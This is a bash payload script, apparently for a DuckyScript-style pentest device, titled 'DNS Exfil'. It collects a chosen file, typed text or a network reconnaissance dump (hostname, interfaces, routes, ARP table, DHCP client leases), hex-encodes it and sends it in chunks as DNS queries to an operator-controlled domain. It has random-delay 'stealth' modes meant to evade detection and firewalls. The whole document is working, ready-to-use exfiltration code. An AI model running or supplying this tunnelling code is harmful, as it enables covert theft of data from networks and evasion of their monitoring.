#!/bin/bash
# Title: DNS Exfil
# Author: NullSec
# Description: Data exfiltration via DNS tunneling queries
# Category: nullsec/exfiltration

LOOT_DIR="/mmc/nullsec/dnsexfil"
mkdir -p "$LOOT_DIR"

PROMPT "DNS EXFIL

Exfiltrate data using DNS
query tunneling. Encodes
data into subdomain queries
that bypass most firewalls.

Features:
- Base32/hex encoding
- Chunked DNS queries
- Configurable DNS server
- Stealth timing control
- Supports TXT/CNAME/A

Press OK to configure."

# Check for required tools
if ! command -v nslookup >/dev/null 2>&1 && ! command -v dig >/dev/null 2>&1; then
    ERROR_DIALOG "Missing DNS tools!

Install bind-tools:
opkg update && opkg install
bind-dig"
    exit 1
fi

DNS_TOOL="nslookup"
command -v dig >/dev/null 2>&1 && DNS_TOOL="dig"
LOG "Using DNS tool: $DNS_TOOL"

DNS_SERVER=$(TEXT_PICKER "DNS Server IP:" "8.8.8.8")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DNS_SERVER="8.8.8.8" ;; esac

DOMAIN=$(TEXT_PICKER "Tunnel domain:" "t.example.com")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DOMAIN="t.example.com" ;; esac

[ "$DOMAIN" = "t.example.com" ] && { ERROR_DIALOG "Configure a real domain!

You need a domain with NS
records pointing to your
receiving server."; exit 1; }

PROMPT "DATA SOURCE:

1. File from loot dir
2. Custom file path
3. Text input
4. System info dump

Select source next."

DATA_SRC=$(NUMBER_PICKER "Source (1-4):" 4)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DATA_SRC=4 ;; esac
[ "$DATA_SRC" -lt 1 ] && DATA_SRC=1
[ "$DATA_SRC" -gt 4 ] && DATA_SRC=4

DATA_FILE="/tmp/dnsexfil_data_$$.txt"

case $DATA_SRC in
    1) # Loot directory file
        SRC_FILE=$(TEXT_PICKER "Loot file:" "/mmc/nullsec/datavacuum/latest.txt")
        [ ! -f "$SRC_FILE" ] && { ERROR_DIALOG "File not found:
$SRC_FILE"; exit 1; }
        cp "$SRC_FILE" "$DATA_FILE"
        ;;
    2) # Custom path
        SRC_FILE=$(TEXT_PICKER "File path:" "/tmp/data.txt")
        [ ! -f "$SRC_FILE" ] && { ERROR_DIALOG "File not found:
$SRC_FILE"; exit 1; }
        cp "$SRC_FILE" "$DATA_FILE"
        ;;
    3) # Text input
        TEXT_DATA=$(TEXT_PICKER "Data to exfil:" "")
        [ -z "$TEXT_DATA" ] && { ERROR_DIALOG "No data provided!"; exit 1; }
        echo "$TEXT_DATA" > "$DATA_FILE"
        ;;
    4) # System info
        {
            echo "=== NULLSEC DNS EXFIL ==="
            echo "Hostname: $(cat /proc/sys/kernel/hostname)"
            echo "Date: $(date)"
            echo "Uptime: $(uptime)"
            echo "Interfaces:"
            ip -4 addr show | grep -E 'inet |^[0-9]'
            echo "Routes:"
            ip route
            echo "ARP:"
            arp -a 2>/dev/null || cat /proc/net/arp
            echo "Clients:"
            cat /tmp/dhcp.leases 2>/dev/null
        } > "$DATA_FILE"
        ;;
esac

DATA_SIZE=$(wc -c < "$DATA_FILE" | tr -d ' ')
LOG "Data to exfil: $DATA_SIZE bytes"

PROMPT "TIMING MODE:

1. Fast (50ms delay)
2. Normal (200ms delay)
3. Stealth (1-3s random)
4. Ultra-stealth (5-15s)

Slower = less detectable
Select mode next."

TIMING=$(NUMBER_PICKER "Timing (1-4):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TIMING=2 ;; esac

case $TIMING in
    1) MIN_DELAY=0.05; MAX_DELAY=0.05 ;;
    2) MIN_DELAY=0.2;  MAX_DELAY=0.2  ;;
    3) MIN_DELAY=1;    MAX_DELAY=3    ;;
    4) MIN_DELAY=5;    MAX_DELAY=15   ;;
esac

# Estimate time
CHUNK_SIZE=30
TOTAL_CHUNKS=$(( (DATA_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))
EST_TIME=$(echo "$TOTAL_CHUNKS $MIN_DELAY" | awk '{printf "%.0f", $1 * $2}')

resp=$(CONFIRMATION_DIALOG "START DNS EXFIL?

Domain: $DOMAIN
Server: $DNS_SERVER
Data: $DATA_SIZE bytes
Chunks: $TOTAL_CHUNKS
Est time: ~${EST_TIME}s
Timing: Mode $TIMING

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f "$DATA_FILE"; exit 0; }

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
EXFIL_LOG="$LOOT_DIR/exfil_$TIMESTAMP.log"

LOG "DNS exfil started to $DOMAIN"
SPINNER_START "Exfiltrating via DNS..."

# Encode data to hex and chunk it
HEX_DATA=$(xxd -p "$DATA_FILE" | tr -d '\n')
HEX_LEN=${#HEX_DATA}
SENT=0
SEQ=0
ERRORS=0

while [ $SENT -lt $HEX_LEN ]; do
    CHUNK="${HEX_DATA:$SENT:$((CHUNK_SIZE * 2))}"
    QUERY="${SEQ}.${CHUNK}.${DOMAIN}"

    if [ "$DNS_TOOL" = "dig" ]; then
        RESULT=$(dig +short +tries=1 +time=2 "$QUERY" @"$DNS_SERVER" A 2>/dev/null)
    else
        RESULT=$(nslookup "$QUERY" "$DNS_SERVER" 2>/dev/null)
    fi

    if [ $? -ne 0 ]; then
        ERRORS=$((ERRORS + 1))
        echo "[$SEQ] FAIL: $QUERY" >> "$EXFIL_LOG"
    else
        echo "[$SEQ] OK: ${CHUNK:0:16}..." >> "$EXFIL_LOG"
    fi

    SEQ=$((SEQ + 1))
    SENT=$((SENT + CHUNK_SIZE * 2))

    # Delay
    if [ "$MIN_DELAY" = "$MAX_DELAY" ]; then
        sleep "$MIN_DELAY"
    else
        RAND_DELAY=$(awk -v min="$MIN_DELAY" -v max="$MAX_DELAY" 'BEGIN{srand(); printf "%.1f", min + rand() * (max - min)}')
        sleep "$RAND_DELAY"
    fi
done

SPINNER_STOP

rm -f "$DATA_FILE"

LOG "DNS exfil complete: $SEQ chunks, $ERRORS errors"

PROMPT "DNS EXFIL COMPLETE

Chunks sent: $SEQ
Errors: $ERRORS
Data size: $DATA_SIZE bytes
Domain: $DOMAIN

Log: $EXFIL_LOG

Reassemble on server with
the DNS exfil receiver."
